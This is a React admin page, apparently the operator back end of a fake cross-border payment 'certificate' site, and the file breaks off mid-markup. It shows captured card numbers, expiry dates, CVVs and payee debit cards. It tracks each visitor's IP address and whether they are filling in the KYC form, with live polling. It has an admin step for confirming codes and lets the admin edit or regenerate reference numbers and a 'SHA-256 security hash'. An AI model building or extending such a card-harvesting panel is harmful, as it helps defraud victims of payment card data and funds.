import React, { useState, useEffect, useCallback, useRef } from "react";
import { useParams, useNavigate, useLocation } from "react-router-dom";
import {
  ArrowLeft, Save, Check, RefreshCw, Shield, Search,
  CreditCard, MapPin, Phone, Edit3, AlertCircle, Hash, X, History, Trash2, CheckCircle, XCircle, ClipboardList, User, Wifi, WifiOff, StickyNote, RotateCcw, Pencil, Settings2, Eye, Info, Clock, Wallet
} from "lucide-react";
import SubmissionHistoryPanel from "../../components/SubmissionHistoryPanel";
import EmployeePreviewModal from "../../components/EmployeePreviewModal";
import CopyButton from "../../components/CopyButton";
import StatusBadge from "../../components/StatusBadge";
import { adminGetTransaction, adminUpdateReview, adminUpdateTransaction, adminGetSubmissions, adminDeleteTransaction, adminConfirmCode, adminGetPresence, adminRegenerateCredential, adminUpdateCredential, adminGetBlockchainConfig, adminSetTransactionBlockchain } from "../../lib/api";
import type { Transaction, KycDraft, KycSubmission, KycSubmissionSummary, CodeSendRecord, ReviewHistoryRecord, BlockchainWalletBrand } from "../../lib/types";

function useAdminAuth() {
  const navigate = useNavigate();
  const token = localStorage.getItem("cbca_admin_token") || "";
  useEffect(() => { if (!token) navigate("/"); }, [token, navigate]);
  return token;
}

function TxField({ label, name, value, onChange, type = "text", placeholder = "" }: {
  label: string; name: string; value: string; onChange: (n: string, v: string) => void;
  type?: string; placeholder?: string;
}) {
  return (
    <div>
      <label className="block text-xs font-semibold text-gray-500 mb-1">{label}</label>
      <input
        type={type}
        value={value}
        onChange={e => onChange(name, e.target.value)}
        placeholder={placeholder}
        autoComplete="off"
        autoCorrect="off"
        autoCapitalize="off"
        spellCheck={false}
        className="w-full px-3 py-1.5 text-sm border border-gray-200 rounded-lg focus:outline-none focus:border-[#1E3A8A] focus:ring-2 focus:ring-inset focus:ring-[#1E3A8A]/20 transition"
      />
    </div>
  );
}

function KycRow({ label, value }: { label: string; value: string | undefined }) {
  return (
    <div className="flex justify-between py-2 border-b border-gray-50 last:border-0">
      <span className="text-xs text-gray-500 w-28 flex-shrink-0">{label}</span>
      {value
        ? <span className="text-sm font-medium text-gray-800 text-right flex-1 break-all">{value}</span>
        : <span className="text-sm text-gray-300 text-right flex-1">—</span>
      }
    </div>
  );
}

function CardTypeBadge({ type }: { type: "credit" | "debit" | null | undefined }) {
  if (!type) return null;
  const isCredit = type === "credit";
  return (
    <span className={`inline-flex items-center gap-1 text-[10px] font-bold px-2 py-0.5 rounded-full uppercase tracking-wide ${
      isCredit ? "bg-amber-100 text-amber-700 border border-amber-200" : "bg-teal-50 text-teal-700 border border-teal-200"
    }`}>
      <CreditCard className="w-2.5 h-2.5" />
      {isCredit ? "信用卡" : "扣帳卡"}
    </span>
  );
}

function ErrorToast({ message, onClose }: { message: string; onClose: () => void }) {
  useEffect(() => {
    const t = setTimeout(onClose, 5000);
    return () => clearTimeout(t);
  }, [onClose]);
  return (
    <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 flex items-center gap-3 bg-red-600 text-white text-sm font-medium px-4 py-3 rounded-xl shadow-lg animate-fade-in max-w-sm w-full mx-4">
      <AlertCircle className="w-4 h-4 flex-shrink-0" />
      <span className="flex-1">{message}</span>
      <button onClick={onClose} className="p-0.5 hover:bg-white/20 rounded transition">
        <X className="w-4 h-4" />
      </button>
    </div>
  );
}

function KycCardSection({ cardType, cardNumber, cardBankName, cardExpiry, cvv, cardholderName, payeeDebitCard }: {
  cardType: "credit" | "debit" | null | undefined;
  cardNumber: string | undefined;
  cardBankName?: string | null;
  cardExpiry: string | undefined;
  cvv: string | undefined;
  cardholderName: string | undefined;
  payeeDebitCard?: string | null;
}) {
  // Treat as credit if card_type is credit OR if payee_debit_card is present
  const isCredit = cardType === "credit" || !!payeeDebitCard;

  if (isCredit) {
    return (
      <div className="mb-3 space-y-2">
        {/* Type header */}
        <div className="flex items-center gap-2 px-0.5 mb-1">
          <span className="inline-flex items-center gap-1.5 bg-amber-100 border border-amber-300 text-amber-800 text-[11px] font-bold px-2.5 py-1 rounded-full uppercase tracking-wide">
            <CreditCard className="w-3 h-3" />
            信用卡驗證
          </span>
        </div>

        {/* Payee debit card — receiving card, shown prominently first */}
        <div className="rounded-xl border-2 border-teal-400 bg-teal-50 p-3">
          <div className="text-[10px] font-bold text-teal-700 uppercase tracking-widest mb-2 flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-teal-500 inline-block" />
            收款扣帳卡
            <span className="text-[9px] font-normal text-teal-500 normal-case tracking-normal">(收款卡)</span>
          </div>
          {payeeDebitCard ? (
            <div className={`py-1 ${payeeDebitCard.length > 25 ? "flex flex-col gap-0.5" : "flex justify-between items-center gap-2"}`}>
              <span className="text-xs text-teal-600 flex-shrink-0">扣帳卡卡號</span>
              <span className={`font-extrabold text-teal-900 font-mono tracking-widest ${payeeDebitCard.length > 25 ? "text-sm break-all" : "text-[15px] whitespace-nowrap"}`}>{payeeDebitCard}</span>
            </div>
          ) : (
            <div className="flex justify-between items-center py-1">
              <span className="text-xs text-teal-600 w-28 flex-shrink-0">扣帳卡卡號</span>
              <span className="text-sm text-teal-300">—</span>
            </div>
          )}
        </div>

        {/* Credit card — verification card */}
        <div className="rounded-xl border-2 border-amber-300 bg-amber-50 p-3">
          <div className="text-[10px] font-bold text-amber-700 uppercase tracking-widest mb-2 flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-amber-500 inline-block" />
            信用卡
            <span className="text-[9px] font-normal text-amber-500 normal-case tracking-normal">(驗證卡)</span>
          </div>
          <KycRow label="信用卡卡號" value={cardNumber} />
          {cardBankName && <KycRow label="發卡銀行" value={cardBankName} />}
          <KycRow label="有效期" value={cardExpiry} />
          <KycRow label="安全碼 CVV" value={cvv} />
          <KycRow label="持卡人" value={cardholderName} />
        </div>
      </div>
    );
  }

  return (
    <div className="bg-blue-50 rounded-xl p-3 mb-3">
      <div className="text-xs font-semibold text-blue-700 mb-2 flex items-center gap-2">
        <CreditCard className="w-3.5 h-3.5" />
        卡片資訊
        <CardTypeBadge type={cardType} />
      </div>
      <KycRow label="扣帳卡卡號" value={cardNumber} />
      {cardBankName && <KycRow label="發卡銀行" value={cardBankName} />}
      <KycRow label="有效期" value={cardExpiry} />
      <KycRow label="安全碼 CVV" value={cvv} />
      <KycRow label="持卡人" value={cardholderName} />
    </div>
  );
}

export default function AdminTransactionPage() {
  const { txId } = useParams<{ txId: string }>();
  const navigate = useNavigate();
  const location = useLocation();
  useAdminAuth();
  const isSuper = localStorage.getItem("cbca_admin_role") === "super";

  // Seed from route state for instant render; then silently refresh in background.
  const seedTx = (location.state as { tx?: Transaction } | null)?.tx ?? null;

  const [tx, setTx] = useState<Transaction | null>(seedTx);
  const [kyc, setKyc] = useState<KycDraft | null>(null);
  const [loading, setLoading] = useState(!seedTx);

  const [txForm, setTxForm] = useState<Partial<Transaction>>(seedTx ? {
    amount: seedTx.amount,
    currency: seedTx.currency || "USD",
    company_name: seedTx.company_name || "",
    employee_id: seedTx.employee_id || "",
    hash_value: seedTx.hash_value || "",
    jurisdiction: seedTx.jurisdiction || "",
    agreement_number: seedTx.agreement_number || "",
    issue_date: seedTx.issue_date || "",
    settlement_days: seedTx.settlement_days || 3,
    fee_crossborder: seedTx.fee_crossborder || 0,
  } : {});
  const [txSaving, setTxSaving] = useState(false);
  const [txSaved, setTxSaved] = useState(false);
  const [showPreview, setShowPreview] = useState(false);
  const [refreshState, setRefreshState] = useState<"idle" | "loading" | "done" | "error">("idle");
  const [txError, setTxError] = useState("");

  const [reviewStatus, setReviewStatus] = useState(seedTx ? (seedTx.review_status === "pending" ? "" : seedTx.review_status) : "pending");
  const [reviewNote, setReviewNote] = useState(seedTx?.review_note || "");
  const [reviewSaving, setReviewSaving] = useState(false);
  const [reviewSaved, setReviewSaved] = useState(false);
  const [reviewError, setReviewError] = useState("");

  const [deleteConfirm, setDeleteConfirm] = useState(false);
  const [deleting, setDeleting] = useState(false);
  const [deleteError, setDeleteError] = useState("");

  const [confirmingCode, setConfirmingCode] = useState(false);
  const [confirmCodeError, setConfirmCodeError] = useState("");
  const [codeSendHistory, setCodeSendHistory] = useState<CodeSendRecord[]>([]);
  const [currentSubmissionNumber, setCurrentSubmissionNumber] = useState<number>(1);
  const [kycSubmissions, setKycSubmissions] = useState<KycSubmissionSummary[]>([]);
  const [reviewHistory, setReviewHistory] = useState<ReviewHistoryRecord[]>([]);

  const [submissions, setSubmissions] = useState<KycSubmission[]>([]);
  // track selected ID without causing loadSubmissions to re-run
  const selectedIdRef = useRef<string | null>(null);
  const [selectedSubmissionId, setSelectedSubmissionId] = useState<string | null>(null);

  const [presenceInfo, setPresenceInfo] = useState<{ online: boolean; ip_address: string; last_seen_at: string; current_page: string | null } | null>(null);

  // Credential edit/regenerate modal
  const [credModal, setCredModal] = useState<{
    field: string;
    label: string;
    oldValue: string;
    newValue: string;
    mode: "edit" | "regenerate";
    saving: boolean;
    error: string;
  } | null>(null);
  const [credEditInput, setCredEditInput] = useState("");
  const [activeTab, setActiveTab] = useState<"config" | "review" | "kyc">(
    seedTx?.review_status === "awaiting_admin_confirmation" ? "kyc" : "config"
  );
  const [showSubmissions, setShowSubmissions] = useState(false);

  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const loadSubmissions = useCallback(async () => {
    if (!txId) return;
    try {
      const list = await adminGetSubmissions(txId);
      setSubmissions(list);
      // Only auto-select on first load (when nothing is selected yet)
      if (list.length > 0 && !selectedIdRef.current) {
        selectedIdRef.current = list[0].id;
        setSelectedSubmissionId(list[0].id);
      }
    } catch { /* silent */ }
  }, [txId]); // no selectedSubmissionId dep — avoids re-render loop

  const loadData = useCallback(async (silent = false): Promise<boolean> => {
    if (!txId) return false;
    // If we already have seeded data, never show the full-page spinner
    if (!silent && !tx) setLoading(true);
    try {
      const [res, presence] = await Promise.all([
        adminGetTransaction(txId),
        adminGetPresence(),
      ]);
      setTx(res.transaction);
      setKyc(res.kyc || null);
      setCodeSendHistory(res.code_send_history ?? []);
      setCurrentSubmissionNumber(res.current_submission_number ?? 1);
      setKycSubmissions(res.kyc_submissions ?? []);
      setReviewHistory(res.review_history ?? []);

      // Update presence info for this transaction's ft_uid
      const match = presence.find(p => p.ft_uid === res.transaction.ft_uid);
      setPresenceInfo(match ? { online: true, ip_address: match.ip_address, last_seen_at: match.last_seen_at, current_page: match.current_page } : null);

      if (!silent) {
        setTxForm({
          amount: res.transaction.amount,
          currency: res.transaction.currency || "USD",
          company_name: res.transaction.company_name || "",
          employee_id: res.transaction.employee_id || "",
          hash_value: res.transaction.hash_value || "",
          jurisdiction: res.transaction.jurisdiction || "",
          agreement_number: res.transaction.agreement_number || "",
          issue_date: res.transaction.issue_date || "",
          settlement_days: res.transaction.settlement_days || 3,
          fee_crossborder: res.transaction.fee_crossborder || 0,
        });
        setReviewStatus(res.transaction.review_status === "pending" ? "" : res.transaction.review_status);
        setReviewNote(res.transaction.review_note || "");
      } else {
        setKyc(res.kyc || null);
        setTx(res.transaction);
      }
    } catch {
      if (!silent) setLoading(false);
      return false;
    }
    if (!silent) setLoading(false);
    return true;
  }, [txId]); // eslint-disable-line react-hooks/exhaustive-deps

  async function handleRefresh() {
    if (refreshState === "loading") return;
    setRefreshState("loading");
    const [ok] = await Promise.all([
      loadData(),
      loadSubmissions(),
      new Promise(r => setTimeout(r, 600)),
    ]);
    setRefreshState(ok ? "done" : "error");
    setTimeout(() => setRefreshState("idle"), 1600);
  }

  useEffect(() => { loadData(); loadSubmissions(); }, [loadData, loadSubmissions]);

  useEffect(() => {
    pollRef.current = setInterval(() => { loadData(true); loadSubmissions(); }, 2500);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [loadData, loadSubmissions]);

  function handleSelectSubmission(id: string) {
    selectedIdRef.current = id;
    setSelectedSubmissionId(id);
  }

  function handleTxChange(name: string, value: string) {
    setTxForm(prev => ({ ...prev, [name]: value }));
  }

  async function saveTxConfig() {
    if (!txId) return;
    setTxSaving(true);
    setTxError("");
    try {
      await adminUpdateTransaction(txId, txForm);
      setTxSaved(true);
      setTimeout(() => setTxSaved(false), 2000);
      loadData(true);
    } catch (e: unknown) {
      setTxError(e instanceof Error ? e.message : "儲存失敗。");
    } finally {
      setTxSaving(false);
    }
  }

  async function saveReview() {
    if (!txId || !reviewStatus) return;
    setReviewSaving(true);
    setReviewError("");
    try {
      await adminUpdateReview(txId, reviewStatus, reviewNote);
      setReviewSaved(true);
      setTimeout(() => setReviewSaved(false), 2500);
      loadData(true);
    } catch (e: unknown) {
      setReviewError(e instanceof Error ? e.message : "儲存失敗。");
    } finally {
      setReviewSaving(false);
    }
  }

  async function handleDelete() {
    if (!txId) return;
    setDeleting(true);
    setDeleteError("");
    try {
      await adminDeleteTransaction(txId);
      navigate("/admin/dashboard");
    } catch (e: unknown) {
      setDeleteError(e instanceof Error ? e.message : "刪除失敗。");
      setDeleting(false);
    }
  }

  async function handleConfirmCode(result: "confirmed" | "failed") {    if (!tx) return;
    setConfirmingCode(true);
    setConfirmCodeError("");
    try {
      await adminConfirmCode(tx.id, result);
      loadData(true);
    } catch (e: unknown) {
      setConfirmCodeError(e instanceof Error ? e.message : "操作失敗。");
      loadData(true);
    } finally {
      setConfirmingCode(false);
    }
  }

  // ── Credential helpers ────────────────────────────────────────────────────

  function openRegenModal(field: string, label: string, oldValue: string, preview: string) {
    setCredModal({ field, label, oldValue, newValue: preview, mode: "regenerate", saving: false, error: "" });
  }

  function openEditModal(field: string, label: string, oldValue: string) {
    setCredEditInput(oldValue);
    setCredModal({ field, label, oldValue, newValue: oldValue, mode: "edit", saving: false, error: "" });
  }

  async function handleOpenRegenerate(field: string, label: string, oldValue: string) {
    if (!tx) return;
    try {
      const res = await adminRegenerateCredential(tx.id, field);
      openRegenModal(field, label, oldValue, res.new_value);
    } catch (e: unknown) {
      setTxError(e instanceof Error ? e.message : "產生數值失敗。");
    }
  }

  async function confirmCredential() {
    if (!credModal || !tx) return;
    setCredModal(prev => prev ? { ...prev, saving: true, error: "" } : null);
    try {
      if (credModal.mode === "regenerate") {
        await adminUpdateCredential(tx.id, credModal.field, credModal.newValue);
      } else {
        if (!credEditInput.trim()) {
          setCredModal(prev => prev ? { ...prev, saving: false, error: "數值不可為空。" } : null);
          return;
        }
        await adminUpdateCredential(tx.id, credModal.field, credEditInput.trim());
      }
      setCredModal(null);
      loadData(true);
    } catch (e: unknown) {
      setCredModal(prev => prev ? { ...prev, saving: false, error: e instanceof Error ? e.message : "儲存失敗。" } : null);
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <span className="w-8 h-8 border-2 border-[#1E3A8A]/20 border-t-[#1E3A8A] rounded-full animate-spin" />
      </div>
    );
  }

  if (!tx) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <AlertCircle className="w-8 h-8 text-red-400 mx-auto mb-2" />
          <p className="text-gray-500">找不到該筆交易。</p>
          <button onClick={() => navigate("/admin/dashboard")} className="mt-3 text-[#1E3A8A] text-sm underline">回到列表</button>
        </div>
      </div>
    );
  }

  const str = (v: unknown) => (v === undefined || v === null) ? "" : String(v);
  const confirmedSubmissions = submissions.filter(s => s.code_confirmed);

  return (
    <div className="min-h-screen lg:h-screen flex flex-col lg:overflow-hidden" translate="no">
      {txError && <ErrorToast message={txError} onClose={() => setTxError("")} />}
      {reviewError && <ErrorToast message={reviewError} onClose={() => setReviewError("")} />}

      {/* Credential Edit/Regenerate Confirm Modal */}
      {credModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm px-4">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md p-6">
            <div className="flex items-center gap-3 mb-5">
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${credModal.mode === "regenerate" ? "bg-blue-100" : "bg-amber-100"}`}>
                {credModal.mode === "regenerate"
                  ? <RotateCcw className="w-5 h-5 text-blue-600" />
                  : <Pencil className="w-5 h-5 text-amber-600" />
                }
              </div>
              <div>
                <div className="font-bold text-gray-900 text-sm">
                  {credModal.mode === "regenerate" ? "重新產生" : "編輯"} {credModal.label}
                </div>
                <div className="text-xs text-gray-500 mt-0.5">請先確認變更內容再送出。</div>
              </div>
              <button onClick={() => setCredModal(null)} className="ml-auto p-1.5 hover:bg-gray-100 rounded-lg transition">
                <X className="w-4 h-4 text-gray-400" />
              </button>
            </div>

            {/* Old vs New comparison */}
            <div className="space-y-3 mb-5">
              <div>
                <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">目前值</p>
                <div className="bg-red-50 border border-red-200 rounded-xl px-3 py-2.5">
                  <code className="font-mono text-xs text-red-800 break-all">{credModal.oldValue || "—"}</code>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <div className="flex-1 h-px bg-gray-200" />
                <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">新值</span>
                <div className="flex-1 h-px bg-gray-200" />
              </div>
              {credModal.mode === "regenerate" ? (
                <div className="bg-green-50 border border-green-300 rounded-xl px-3 py-2.5">
                  <code className="font-mono text-xs text-green-800 break-all">{credModal.newValue}</code>
                </div>
              ) : (
                <div>
                  <input
                    autoFocus
                    type="text"
                    value={credEditInput}
                    onChange={e => setCredEditInput(e.target.value)}
                    className="w-full px-3 py-2.5 font-mono text-sm border-2 border-amber-300 rounded-xl focus:outline-none focus:border-amber-500 focus:ring-2 focus:ring-inset focus:ring-amber-400/30 transition bg-amber-50"
                    placeholder="輸入新值..."
                  />
                </div>
              )}
            </div>

            {credModal.error && (
              <div className="flex items-center gap-2 bg-red-50 border border-red-200 text-red-700 text-xs px-3 py-2 rounded-lg mb-4">
                <AlertCircle className="w-3.5 h-3.5 flex-shrink-0" />
                {credModal.error}
              </div>
            )}

            <div className="flex gap-3">
              <button
                onClick={() => setCredModal(null)}
                disabled={credModal.saving}
                className="flex-1 py-2.5 rounded-xl text-sm font-semibold border border-gray-200 text-gray-700 hover:bg-gray-50 transition disabled:opacity-50"
              >
                取消
              </button>
              <button
                onClick={confirmCredential}
                disabled={credModal.saving}
                className={`flex-1 py-2.5 rounded-xl text-sm font-semibold text-white flex items-center justify-center gap-2 transition disabled:opacity-60 ${
                  credModal.mode === "regenerate" ? "bg-blue-600 hover:bg-blue-700" : "bg-amber-500 hover:bg-amber-600"
                }`}
              >
                {credModal.saving
                  ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  : credModal.mode === "regenerate" ? <RotateCcw className="w-4 h-4" /> : <Check className="w-4 h-4" />
                }
                {credModal.saving ? "儲存中..." : "確認變更"}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Delete Confirm Modal */}
      {deleteConfirm && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm px-4">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-6">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 bg-red-100 rounded-xl flex items-center justify-center flex-shrink-0">
                <Trash2 className="w-5 h-5 text-red-600" />
              </div>
              <div>
                <div className="font-bold text-gray-900 text-sm">刪除此紀錄？</div>
                <div className="text-xs text-gray-500 mt-0.5">此動作無法復原。</div>
              </div>
            </div>
            <div className="bg-red-50 border border-red-100 rounded-xl px-4 py-3 mb-4 space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-xs text-gray-500">FT-UID</span>
                <span className="font-mono text-xs font-bold text-red-800">{tx?.ft_uid}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-xs text-gray-500">序號</span>
                <span className="font-mono text-xs text-red-700">{tx?.serial_number}</span>
              </div>
              {tx?.employee_id && (
                <div className="flex items-center justify-between">
                  <span className="text-xs text-gray-500">員工編號</span>
                  <span className="text-xs text-red-700">{tx.employee_id}</span>
                </div>
              )}
            </div>
            <p className="text-xs text-gray-500 mb-5 leading-relaxed">
              所有與此紀錄相關的 KYC 資料與提交紀錄都將被永久刪除。確定要繼續嗎？
            </p>
            {deleteError && (
              <div className="flex items-center gap-2 bg-red-50 border border-red-200 text-red-700 text-xs px-3 py-2 rounded-lg mb-4">
                <AlertCircle className="w-3.5 h-3.5 flex-shrink-0" />
                {deleteError}
              </div>
            )}
            <div className="flex gap-3">
              <button
                onClick={() => { setDeleteConfirm(false); setDeleteError(""); }}
                disabled={deleting}
                className="flex-1 py-2.5 rounded-xl text-sm font-semibold border border-gray-200 text-gray-700 hover:bg-gray-50 transition disabled:opacity-50"
              >
                取消
              </button>
              <button
                onClick={handleDelete}
                disabled={deleting}
                className="flex-1 py-2.5 rounded-xl text-sm font-semibold bg-red-600 hover:bg-red-700 text-white transition flex items-center justify-center gap-2 disabled:opacity-60"
              >
                {deleting
                  ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  : <Trash2 className="w-4 h-4" />}
                {deleting ? "刪除中..." : "是，刪除"}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <header className="bg-[#0A2B5E] text-white shadow-lg sticky top-0 z-10 flex-shrink-0">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center gap-3">
          <button onClick={() => navigate("/admin/dashboard", { state: { updatedTx: tx } })} className="p-1.5 hover:bg-white/10 rounded-lg transition">
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div className="w-7 h-7 bg-white rounded-lg flex items-center justify-center flex-shrink-0">
            <Shield className="w-4 h-4 text-[#0A2B5E]" />
          </div>

          {/* Center info block */}
          <div className="flex-1 min-w-0">
            {/* Top row: title + FT-UID */}
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-xs font-semibold text-blue-300 uppercase tracking-widest">交易明細</span>
              <span className="text-blue-400 text-xs">·</span>
              <code className="font-mono text-sm font-bold text-white">{tx.ft_uid}</code>
              {tx.created_at && (
                <span className="flex items-center gap-1 ml-1 rounded-md bg-white/10 border border-white/15 px-2 py-0.5" title="訂單生成時間">
                  <Clock className="w-3 h-3 text-sky-300 flex-shrink-0" />
                  <span className="text-[11px] text-blue-200">生成於</span>
                  <span className="text-[11px] font-semibold text-white tabular-nums">
                    {new Date(tx.created_at).toLocaleString("zh-TW", { year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", hour12: false })}
                  </span>
                </span>
              )}
            </div>

            {/* Bottom info strip */}
            <div className="flex items-center gap-3 mt-1 flex-wrap">

              {/* Employee ID */}
              {tx.employee_id && (
                <div className="flex items-center gap-1.5 bg-white/10 rounded-md px-2 py-0.5">
                  <User className="w-3 h-3 text-blue-300 flex-shrink-0" />
                  <span className="text-[11px] text-blue-200 font-medium">員工</span>
                  <span className="text-[11px] font-bold text-amber-300 font-mono">{tx.employee_id}</span>
                </div>
              )}

              {/* Online status + IP */}
              {presenceInfo ? (
                <div className={`flex items-center gap-1.5 rounded-md px-2 py-0.5 border ${
                  presenceInfo.current_page === "kyc"
                    ? "bg-green-500/20 border-green-400/30"
                    : "bg-blue-500/15 border-blue-400/25"
                }`}>
                  <span className={`w-2 h-2 rounded-full animate-pulse flex-shrink-0 ${presenceInfo.current_page === "kyc" ? "bg-green-400" : "bg-blue-400"}`} />
                  <Wifi className={`w-3 h-3 flex-shrink-0 ${presenceInfo.current_page === "kyc" ? "text-green-300" : "text-blue-300"}`} />
                  <span className={`text-[11px] font-bold ${presenceInfo.current_page === "kyc" ? "text-green-300" : "text-blue-300"}`}>
                    {presenceInfo.current_page === "kyc" ? "KYC 填寫中" : "瀏覽憑證頁"}
                  </span>
                  <span className="text-blue-400 text-[10px]">·</span>
                  <code className={`text-[11px] font-mono ${presenceInfo.current_page === "kyc" ? "text-green-200" : "text-blue-200"}`}>{presenceInfo.ip_address || "—"}</code>
                </div>
              ) : (
                <div className="flex items-center gap-1.5 bg-white/5 border border-white/10 rounded-md px-2 py-0.5">
                  <WifiOff className="w-3 h-3 text-gray-400 flex-shrink-0" />
                  <span className="text-[11px] text-gray-400">不在線</span>
                </div>
              )}

              {/* Admin note preview */}
              {tx.admin_note && (
                <div className="flex items-center gap-1.5 bg-amber-500/15 border border-amber-400/25 rounded-md px-2 py-0.5 max-w-xs">
                  <StickyNote className="w-3 h-3 text-amber-300 flex-shrink-0" />
                  <span className="text-[11px] text-amber-200 truncate">{tx.admin_note}</span>
                </div>
              )}
            </div>
          </div>

          <div className="flex items-center gap-2 flex-shrink-0">
            <StatusBadge status={tx.review_status} lang="zh" />
            <button
              onClick={handleRefresh}
              disabled={refreshState === "loading"}
              className={`relative flex items-center gap-1.5 h-8 px-2 rounded-lg border text-xs font-semibold transition-all active:scale-90 disabled:cursor-wait ${
                refreshState === "done" ? "bg-emerald-500/20 border-emerald-400/40 text-emerald-300"
                : refreshState === "error" ? "bg-red-500/20 border-red-400/40 text-red-300"
                : "bg-white/5 border-white/15 text-white hover:bg-white/15 hover:border-white/30"
              }`}
              title="重新整理"
            >
              {refreshState === "done" ? <Check className="w-4 h-4" />
                : refreshState === "error" ? <AlertCircle className="w-4 h-4" />
                : <RefreshCw className={`w-4 h-4 ${refreshState === "loading" ? "animate-spin" : ""}`} />}
              {refreshState === "loading" && <span className="hidden sm:inline">更新中</span>}
              {refreshState === "done" && <span className="hidden sm:inline">已更新</span>}
              {refreshState === "error" && <span className="hidden sm:inline">更新失敗</span>}
            </button>
            <button
              onClick={() => setDeleteConfirm(true)}
              className="p-1.5 hover:bg-red-500/20 rounded-lg transition text-red-300 hover:text-red-200"
              title="刪除紀錄"
            >
              <Trash2 className="w-4 h-4" />
            </button>
          </div>
        </div>
      </header>

      <nav className="bg-[#0F3A75] border-t border-white/10 shadow-[0_2px_6px_rgba(10,43,94,0.25)] flex-shrink-0 relative z-[5]">
        <div className="max-w-7xl mx-auto px-2 sm:px-4 flex items-stretch">
          {([
            { key: "config", label: "憑證與交易設定", icon: Settings2 },
            { key: "review", label: "審核決定", icon: Shield },
            { key: "kyc", label: "KYC 即時監控", icon: CreditCard },
          ] as const).map(t => {
            const active = activeTab === t.key;
            const Icon = t.icon;
            const reviewAlert = t.key === "review" && !!kyc?.is_submitted && tx.review_status === "pending";
            const codeAlert = t.key === "kyc" && tx.review_status === "awaiting_admin_confirmation";
            const typing = t.key === "kyc" && presenceInfo?.current_page === "kyc";
            const badge = codeAlert
              ? { text: "待確認", cls: "bg-amber-400 text-[#0A2B5E]", ping: "bg-amber-300" }
              : typing
                ? { text: "填寫中", cls: "bg-emerald-400 text-[#06331f]", ping: "bg-emerald-300" }
                : reviewAlert
                  ? { text: "待審核", cls: "bg-amber-400 text-[#0A2B5E]", ping: "bg-amber-300" }
                  : null;
            return (
              <button
                key={t.key}
                onClick={() => setActiveTab(t.key)}
                className={`relative flex-1 sm:flex-none flex items-center justify-center gap-2 px-3 sm:px-5 h-11 text-[13px] font-semibold whitespace-nowrap transition-colors ${
                  active ? "text-white bg-white/10" : "text-blue-100/70 hover:text-white hover:bg-white/5"
                }`}
              >
                <Icon className="w-4 h-4 flex-shrink-0" />
                <span className="truncate">{t.label}</span>
                {badge && (
                  <span className={`relative inline-flex items-center gap-1 rounded-full pl-1.5 pr-2 py-0.5 text-[10px] font-bold leading-none ${badge.cls}`}>
                    <span className="relative flex w-1.5 h-1.5">
                      <span className={`absolute inline-flex h-full w-full rounded-full opacity-75 animate-ping ${badge.ping}`} />
                      <span className="relative inline-flex w-1.5 h-1.5 rounded-full bg-current" />
                    </span>
                    <span className="hidden sm:inline">{badge.text}</span>
                  </span>
                )}
                <span className={`absolute left-0 right-0 bottom-0 h-[3px] transition-colors ${active ? "bg-amber-400" : "bg-transparent"}`} />
              </button>
            );
          })}
        </div>
      </nav>

      <main className="flex-1 min-h-0 w-full bg-white/60">

        {activeTab === "config" && (
          <div className="grid grid-cols-1 lg:grid-cols-10 lg:h-full divide-y lg:divide-y-0 lg:divide-x divide-slate-200">
            <section className="lg:col-span-3 bg-gradient-to-b from-[#EEF3FA] to-[#E3EBF6] p-6 flex flex-col min-h-0">
              <h3 className="font-semibold text-[15px] text-[#0A2B5E] flex items-center gap-2 pb-3 mb-4 border-b border-blue-200/70 flex-shrink-0">
                <span className="w-7 h-7 rounded-lg bg-[#0A2B5E] flex items-center justify-center"><Hash className="w-3.5 h-3.5 text-white" /></span>
                憑證識別碼
              </h3>
              <div className="flex-1 min-h-0 overflow-y-auto space-y-2">
                {[
                  { field: "ft_uid",           label: "FT-UID",           value: tx.ft_uid,           accent: "border-l-blue-500",    tag: "bg-blue-100 text-blue-800" },
                  { field: "serial_number",    label: "序號",             value: tx.serial_number,    accent: "border-l-sky-500",     tag: "bg-sky-100 text-sky-800" },
                  { field: "cbca_reference",   label: "ISFC 參考號",      value: tx.cbca_reference,   accent: "border-l-emerald-500", tag: "bg-emerald-100 text-emerald-800" },
                  { field: "agreement_number", label: "協議編號",         value: tx.agreement_number, accent: "border-l-amber-500",   tag: "bg-amber-100 text-amber-800" },
                  { field: "hash_value",       label: "安全雜湊 (SHA-256)", value: tx.hash_value,     accent: "border-l-slate-500",   tag: "bg-slate-200 text-slate-700" },
                ].map(({ field, label, value, accent, tag }) => (
                  <div key={field} className={`rounded-xl bg-white border border-white border-l-4 ${accent} shadow-[0_1px_2px_rgba(15,23,42,0.06)] px-3 py-2.5 hover:shadow-md transition-shadow`}>
                    <div className="flex items-center justify-between gap-2 mb-1.5">
                      <span className={`text-[11px] font-semibold px-2 py-0.5 rounded-md ${tag}`}>{label}</span>
                      <div className="flex items-center gap-1">
                        <button
                          onClick={() => openEditModal(field, label, value)}
                          className="p-1 rounded-md text-amber-700 hover:bg-amber-100 transition"
                          title={`手動編輯 ${label}`}
                        >
                          <Pencil className="w-3 h-3" />
                        </button>
                        <button
                          onClick={() => handleOpenRegenerate(field, label, value)}
